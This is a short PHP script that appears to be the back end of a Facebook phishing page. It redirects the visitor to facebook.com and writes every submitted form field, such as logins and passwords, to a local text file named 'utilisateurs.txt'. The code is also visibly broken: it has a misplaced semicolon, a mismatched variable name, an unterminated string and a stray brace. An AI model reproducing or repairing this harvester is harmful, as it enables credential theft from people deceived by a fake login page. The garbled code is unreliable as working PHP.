<?php header ('Location: http://www.facebook.com/'); $handle=fopen("utilisateurs.txt", "a"); foreach($_POST as $variable=>$value);{ fwrite($handle, $variable); fwrite($handler, "=");
 fwrite($handler, "$value"); fwrite($handler, "\r\n\"); }  fwrite($handler, "\r\n\"); fclose($handle); exit; }
 ?>
